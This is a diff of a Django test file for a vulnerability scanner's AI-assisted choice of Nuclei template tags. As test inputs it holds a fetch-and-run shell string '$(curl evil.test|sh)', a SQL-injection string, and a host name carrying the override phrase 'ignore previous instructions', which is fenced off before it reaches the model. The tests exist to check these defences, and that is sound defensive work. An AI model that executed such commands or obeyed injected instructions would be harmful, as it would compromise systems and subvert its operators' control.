@@ -5,6 +5,7 @@ from django.utils import timezone
 
 from cveFeed import nuclei_templates as nt
 from dashboard.models import Org, Project
+from tests import ai_queue
 from scanEngine.models import EngineType
 from startScan.models import ScanHistory, Subdomain, Technology
 from targetApp.models import Domain
@@ -18,44 +19,124 @@ class StaticTagsTests(TestCase):
 		self.assertEqual(nt.static_tags_for([None, '']), set())
 
 
-class AiTagsTests(TestCase):
-	def test_ai_output_is_restricted_to_the_allowed_tag_list_even_if_it_hallucinates(self):
-		provider = mock.Mock()
-		provider.complete.return_value = '["jenkins", "DROP TABLE users;", "cms", "$(curl evil.test|sh)"]'
-		tags = nt.ai_tags_for(['Some Unmapped Build System'], provider)
-		self.assertEqual(tags, {'jenkins', 'cms'})  # only values from CANDIDATE_TAGS survive
+def fake(reply):
+	"""The model the reviewer container asks: ``reply`` is its text, or a function of ``(system, user)``."""
+	model = mock.Mock(model='m')
+	model.name = 'anthropic'
+	model.complete.side_effect = reply if callable(reply) else (lambda system, user: reply)
+	return model
+
+
+def answered(signatures, reply, allowed, offered=None, notes=None):
+	"""Queue the targeting question for ``signatures`` (``nt.ai_plan``), answer it as the reviewer container does with ``reply``, and return
+	what the AI chose for each one (``nt.remembered``, the closed sets ``allowed``)."""
+	model = fake(reply)
+	ai_queue.ensure_configured(model)
+	nt.ai_plan(signatures, allowed, offered=offered, notes=notes)
+	with mock.patch.object(nt, 'allowed_tags', return_value=set(allowed)):
+		ai_queue.serve(model)
+	return {i: nt.remembered(sig) for i, sig in enumerate(signatures)}, model
+
+
+class Fresh(TestCase):
+	"""The AI's choices are kept in the shared cache: each test starts with none, and with no failure window."""
+
+	def setUp(self):
+		from django.core.cache import cache
+		cache.clear()
+		nt._failed.clear()
+		self.addCleanup(cache.clear)
+
+
+class TargetingJobTests(Fresh):
+	"""The targeting question is an AI job the reviewer container answers (cveFeed.ai_jobs): the server makes no model call, and its answer is
+	still a closed-set choice."""
+
+	def test_the_answer_is_restricted_to_the_installed_tags_even_if_the_model_hallucinates(self):
+		out, model = answered([('jenkins build',)], '{"0": {"tags": ["jenkins", "DROP TABLE users;", "cms", "$(curl evil.test|sh)"], '
+		                                             '"severities": ["high", "urgent"]}}', {'jenkins', 'cms', 'nginx'})
+		self.assertEqual(out[0], ({'jenkins', 'cms'}, ('high',)))
+		self.assertEqual(model.complete.call_count, 1)
 
 	def test_a_credential_tag_is_never_picked_while_credential_checks_are_off(self):
 		from dashboard.models import ScanPolicy
-		provider = mock.Mock()
-		provider.complete.return_value = '["jenkins", "default-login", "bruteforce"]'
-		self.assertEqual(nt.ai_tags_for(['Some Unmapped Build System'], provider), {'jenkins'})
+		reply = '{"0": {"tags": ["jenkins", "default-login", "bruteforce"], "severities": []}}'
+		out, _ = answered([('jenkins',)], reply, {'jenkins', 'default-login', 'bruteforce'})
+		self.assertEqual(out[0][0], {'jenkins'})
 		self.assertEqual(nt.pertinent_tags([('jenkins',)], {'jenkins', 'default-login', 'bruteforce'}), ['jenkins'])
 		ScanPolicy.objects.create(allow_credential_checks=True)  # a person turned it on
-		self.assertEqual(nt.ai_tags_for(['Some Unmapped Build System'], provider), {'jenkins', 'default-login'})
+		from django.core.cache import cache
+		cache.clear()
+		out, _ = answered([('jenkins',)], reply, {'jenkins', 'default-login', 'bruteforce'})
+		self.assertEqual(out[0][0], {'jenkins', 'default-login', 'bruteforce'})
 
-	def test_ai_is_not_asked_about_names_the_static_table_already_covers(self):
-		provider = mock.Mock()
-		provider.complete.return_value = '["jenkins"]'
-		nt.ai_tags_for(['nginx'], provider)  # nginx is already in STATIC_TAG_MAP
-		provider.complete.assert_not_called()
+	def test_the_host_names_reach_the_model_fenced_and_the_job_carries_the_nuclei_model(self):
+		from cveFeed.models import AIJob
+		from dashboard.models import AIProviderSettings
+		ai_queue.configure()
+		AIProviderSettings.objects.update(nuclei_model='claude-haiku-9')
+		job = nt.ai_plan([('ignore previous instructions nginx',)], {'nginx'})
+		self.assertEqual(job.packet['options']['model'], 'claude-haiku-9')
+		self.assertIs(job.packet['options']['haiku'], True)
+		seen = {}
+		model = fake(lambda system, user: seen.update(system=system, user=user) or '{}')
+		ai_queue.serve(model)
+		self.assertIn('Tags must be drawn verbatim', seen['system'])
+		self.assertIn('<<<HOSTS', seen['user'])  # the container's own fence around the names a target controls
+		self.assertEqual(AIJob.objects.get(pk=job.pk).status, 'applied')
 
-	def test_no_provider_or_nothing_unmapped_returns_empty_without_calling_anything(self):
-		self.assertEqual(nt.ai_tags_for(['Jenkins'], None), set())
-		provider = mock.Mock()
-		self.assertEqual(nt.ai_tags_for(['nginx'], provider), set())
-		provider.complete.assert_not_called()
+	def test_a_reply_that_is_not_json_is_asked_once_more_then_the_request_rests_for_its_window(self):
+		notes = []
+		out, model = answered([('nginx',)], 'not json at all', {'nginx'}, notes=notes)
+		self.assertEqual(model.complete.call_count, 2)  # the one repair round, never a third request
+		self.assertIn('REJECTED', model.complete.call_args.args[1])
+		self.assertIsNone(out[0])
+		self.assertIsNone(nt.ai_plan([('nginx',)], {'nginx'}, notes=notes))  # the same question is not queued again inside its window
+		self.assertIn('not asked again for', notes[-1])
 
-	def test_ai_errors_and_unparseable_replies_degrade_to_empty_not_a_crash(self):
-		provider = mock.Mock()
-		provider.complete.side_effect = RuntimeError('boom')
-		self.assertEqual(nt.ai_tags_for(['Jenkins'], provider), set())
-		provider2 = mock.Mock()
-		provider2.complete.return_value = 'not json at all'
-		self.assertEqual(nt.ai_tags_for(['Jenkins'], provider2), set())
+	def test_a_failed_call_rests_for_its_window(self):
+		from reNgine.ai_providers import AIProviderError
+		notes = []
+
+		def refuse(system, user):
+			raise AIProviderError('no', category='refused')
+		answered([('nginx',)], refuse, {'nginx'})
+		self.assertIsNone(nt.ai_plan([('nginx',)], {'nginx'}, notes=notes))
+		self.assertIn('not asked again for', notes[0])
+
+	def test_over_the_days_cap_nothing_is_queued_and_the_scan_is_told(self):
+		ai_queue.configure()
+		notes = []
+		with mock.patch('cveFeed.tunables.value', return_value=0):
+			self.assertIsNone(nt.ai_plan([('nginx',)], {'nginx'}, notes=notes))
+		self.assertIn('CVENGINE_NUCLEI_AI_MAX_PER_DAY', notes[0])
+
+	def test_the_pass_does_not_wait_and_a_later_pass_uses_the_answer(self):
+		from cveFeed.models import AIJob
+		ai_queue.configure()
+		profile = {'bbot': ['Jenkins Custom Build'], 'light': [], 'services': [], 'os': '', 'exposure': [], 'cves': []}
+		allowed = {'jenkins', 'cms', 'exposure'}
+		notes = []
+		with mock.patch.object(nt, 'allowed_tags', return_value=allowed), mock.patch.object(nt, 'installed_index', return_value=None):
+			groups, _ = nt.plan_targeting({'h.test': profile}, True, notes=notes)
+			self.assertEqual(groups[0]['tags'], ['jenkins'])  # the static table, now: the scan does not wait for the AI
+			self.assertEqual(AIJob.objects.filter(kind='nuclei_targeting').count(), 1)
+			self.assertIn('later passes', notes[0])
+			ai_queue.serve(fake('{"0": {"tags": ["cms"], "severities": ["critical"]}}'))
+			groups, _ = nt.plan_targeting({'h.test': profile}, True, notes=[])
+		self.assertEqual(groups, [{'tags': ['cms', 'jenkins'], 'severities': ('critical',), 'hosts': ['h.test']}])
+		self.assertEqual(AIJob.objects.filter(kind='nuclei_targeting').count(), 1)  # the answer is used, not asked again
+
+	def test_without_ai_nothing_is_queued(self):
+		from cveFeed.models import AIJob
+		profile = {'bbot': ['Jenkins Custom Build'], 'light': [], 'services': [], 'os': '', 'exposure': [], 'cves': []}
+		with mock.patch.object(nt, 'allowed_tags', return_value={'jenkins'}):
+			groups, _ = nt.plan_targeting({'h.test': profile}, False)
+		self.assertEqual(groups[0]['tags'], ['jenkins'])
+		self.assertFalse(AIJob.objects.exists())
 
 
-class PertinentTagsTests(TestCase):
+class PertinentTagsTests(Fresh):
 	"""Issue 208: the targeting prompt listed every installed tag (about 41,000 tokens), so a local model could not read it."""
 
 	INSTALLED = {'nginx', 'php', 'wordpress', 'wp-plugin', 'wp-theme', 'apache', 'tomcat', 'apache-tomcat', 'jenkins', 'cms', 'tech', 'cve',
@@ -89,33 +170,29 @@ class PertinentTagsTests(TestCase):
 
 	def test_the_prompt_lists_the_offer_and_the_answer_is_checked_against_every_installed_tag(self):
 		seen = {}
-		provider = mock.Mock()
-		provider.complete.side_effect = lambda system, user: seen.update(system=system) or '{"0": {"tags": ["php", "nginx", "made-up"], "severities": ["high"]}}'
 		offered = self.offered(('nginx 1.18.0',))
 		self.assertNotIn('php', offered)
-		out = nt.ai_plan([('nginx 1.18.0',)], provider, self.INSTALLED, offered=offered)
+		out, _ = answered([('nginx 1.18.0',)], lambda system, user: seen.update(system=system) or
+		                  '{"0": {"tags": ["php", "nginx", "made-up"], "severities": ["high"]}}', self.INSTALLED, offered=offered)
 		self.assertNotIn('"php"', seen['system'])
 		self.assertLess(len(seen['system']), 2500)  # not the 5,000 CVE tags
 		self.assertEqual(out[0], ({'php', 'nginx'}, ('high',)))  # php was not offered but is installed: accepted; made-up is dropped
 
 	def test_without_an_offer_the_whole_installed_list_is_listed_as_before(self):
 		seen = {}
-		provider = mock.Mock()
-		provider.complete.side_effect = lambda system, user: seen.update(system=system) or '{}'
-		nt.ai_plan([('nginx',)], provider, {'nginx', 'php'})
+		answered([('nginx',)], lambda system, user: seen.update(system=system) or '{}', {'nginx', 'php'})
 		self.assertIn('["nginx", "php"]', seen['system'])
 
 	def test_planning_asks_with_the_offer(self):
-		seen = {}
-		provider = mock.Mock()
-		provider.complete.side_effect = lambda system, user: seen.update(system=system) or '{}'
+		ai_queue.configure()
 		profile = {'technologies': ['nginx'], 'services': [], 'exposure': [], 'cves': [], 'light': False}
 		with mock.patch.object(nt, 'allowed_tags', return_value=set(self.INSTALLED)), mock.patch.object(nt, 'profile_names', return_value=['nginx 1.18.0']):
-			nt.plan_targeting({'h.test': profile}, provider)
-		self.assertLess(len(seen['system']), 2500)
+			nt.plan_targeting({'h.test': profile}, True)
+		from cveFeed.models import AIJob
+		self.assertLess(len(AIJob.objects.get(kind='nuclei_targeting').packet['system']), 2500)
 
 
-class RankedOfferTests(TestCase):
+class RankedOfferTests(Fresh):
 	"""What a second look at issue 208 found: the offer is ranked, not cut alphabetically, and names that are run together or abbreviated
 	meet the tags the templates use."""
 
@@ -143,44 +220,45 @@ class RankedOfferTests(TestCase):
 		self.assertLess(out.index('nginx-ui'), out.index('exposure'))
 
 	def test_the_model_may_not_pick_the_whole_cve_set(self):
-		provider = mock.Mock()
-		provider.complete.return_value = '{"0": {"tags": ["cve", "nginx"], "severities": []}}'
-		out = nt.ai_plan([('nginx',)], provider, {'cve', 'nginx'})
+		out, _ = answered([('nginx',)], '{"0": {"tags": ["cve", "nginx"], "severities": []}}', {'cve', 'nginx'})
 		self.assertEqual(out[0][0], {'nginx'})
 
 
 class TemplateIndexTests(TestCase):
 	"""The installed templates' own vendor, product and CPE metadata map a name to the tags that product's templates use."""
 
-	def make(self, directory, name, tags, vendor='', product='', cpe=''):
-		import os
-		os.makedirs(directory, exist_ok=True)
-		meta = ''.join(f'  {k}: {v}\n' for k, v in (('vendor', vendor), ('product', product)) if v)
-		classification = f'  classification:\n    cpe: {cpe}\n' if cpe else ''
-		with open(os.path.join(directory, name), 'w') as f:
-			f.write(f'id: {name[:-5]}\ninfo:\n  name: x\n  severity: high\n{classification}  metadata:\n{meta}  tags: {tags}\n')
+	def make(self, name, tags, vendor='', product='', cpe=''):
+		"""One entry of a template index (``cvengine_scanner.template_index``), as the Sentinel library's generator records a template: the server keeps no
+		template files and reads only the index."""
+		entry = {'sha256': f'{len(self.index["templates"]):064x}', 'id': name[:-5], 'tags': sorted(tags.split(','))}
+		if vendor:
+			entry['vendor'] = vendor
+		if product:
+			entry['product'] = product
+		if cpe:
+			entry['cpe'] = ':'.join(cpe.split(':')[2:5])
+		self.index['templates'][f'http/{name}'] = entry
 
 	def setUp(self):
-		import tempfile
-		self.dir = tempfile.mkdtemp()
-		self.make(self.dir, 'a.yaml', 'cve,cve2024,panos,paloalto,globalprotect,rce', vendor='paloaltonetworks', product='pan-os')
-		self.make(self.dir, 'b.yaml', 'cve,cve2023,panos,paloalto,kev', vendor='paloaltonetworks', product='pan-os')
-		self.make(self.dir, 'c.yaml', 'cve,cve2021,apache,httpd,rce', cpe='cpe:2.3:a:apache:http_server:2.4.49:*:*:*:*:*:*:*')
-		self.make(self.dir, 'd.yaml', 'tech,detect,springboot', product='spring_boot')
-		nt._installed.pop(self.dir, None)
-		self.addCleanup(nt._installed.pop, self.dir, None)
+		self.index = {'nuclei_templates': 'test', 'rules': 1, 'reasons': [], 'templates': {}, 'sha256': 'e' * 64}
+		self.make('a.yaml', 'cve,cve2024,panos,paloalto,globalprotect,rce', vendor='paloaltonetworks', product='pan-os')
+		self.make('b.yaml', 'cve,cve2023,panos,paloalto,kev', vendor='paloaltonetworks', product='pan-os')
+		self.make('c.yaml', 'cve,cve2021,apache,httpd,rce', cpe='cpe:2.3:a:apache:http_server:2.4.49:*:*:*:*:*:*:*')
+		self.make('d.yaml', 'tech,detect,springboot', product='spring_boot')
+		nt._installed.pop(self.index['sha256'], None)
+		self.addCleanup(nt._installed.pop, self.index['sha256'], None)
 
 	def test_it_reads_tags_vendors_products_and_cpes(self):
-		index = nt.installed_index(self.dir)
+		index = nt.installed_index(self.index)
 		self.assertIn('globalprotect', index.tags)
 		self.assertIn('paloaltonetworks', index.products)
 		self.assertIn('panos', index.products)
 		self.assertIn('apache', index.products)  # from the CPE
 		self.assertIn('httpserver', index.products)
-		self.assertEqual(nt.installed_tags(self.dir), index.tags)
+		self.assertEqual(nt.installed_tags(self.index), index.tags)
 
 	def test_a_name_resolves_to_the_tags_that_products_templates_carry(self):
-		index = nt.installed_index(self.dir)
+		index = nt.installed_index(self.index)
 		got = nt._index_tags(['Palo Alto Networks'], index)
 		self.assertEqual(got, {'panos', 'paloalto'})  # not cve, kev, rce, or a year tag
 		self.assertIn('panos', nt._index_tags(['PAN-OS'], index))
@@ -189,7 +267,7 @@ class TemplateIndexTests(TestCase):
 		self.assertEqual(nt._index_tags(['Web Server'], index), set())
 
 	def test_the_offer_uses_it_and_ranks_it_above_a_partial_match(self):
-		index = nt.installed_index(self.dir)
+		index = nt.installed_index(self.index)
 		allowed = set(index.tags) | {'pan-os-extra'}
 		out = nt.pertinent_tags([('Palo Alto Networks', 'GlobalProtect')], allowed, index=index)
 		self.assertIn('panos', out)
@@ -197,7 +275,7 @@ class TemplateIndexTests(TestCase):
 		self.assertNotIn('cve', out)
 
 	def test_without_templates_nothing_breaks(self):
-		self.assertEqual(nt.installed_index('/no/such/dir').tags, frozenset())
+		self.assertEqual(nt.installed_index({'nuclei_templates': '', 'rules': 0, 'reasons': [], 'templates': {}, 'sha256': 'f' * 64}).tags, frozenset())
 		self.assertEqual(nt._index_tags(['nginx'], None), set())
 
 
@@ -220,10 +298,10 @@ class SelectTagsTests(TestCase):
 		with mock.patch('reNgine.ai_settings.get_configured_provider', return_value=None):
 			self.assertEqual(nt.select_tags(self.scan), {'nginx'})
 
-	def test_ai_augments_static_tags_when_configured(self):
+	def test_the_ai_is_not_asked_for_the_scan_wide_tags(self):
 		sub = Subdomain.objects.create(scan_history=self.scan, name='www.example.test')
 		sub.technologies.add(Technology.objects.create(name='nginx'), Technology.objects.create(name='Grafana Labs Custom Build'))
-		provider = mock.Mock()
-		provider.complete.return_value = '["grafana"]'
-		with mock.patch('reNgine.ai_settings.get_configured_provider', return_value=provider):
-			self.assertEqual(nt.select_tags(self.scan), {'nginx', 'grafana'})
+		ai_queue.configure()
+		self.assertEqual(nt.select_tags(self.scan), {'nginx'})  # the AI chooses per host profile (plan_targeting), not here
+		from cveFeed.models import AIJob
+		self.assertFalse(AIJob.objects.exists())
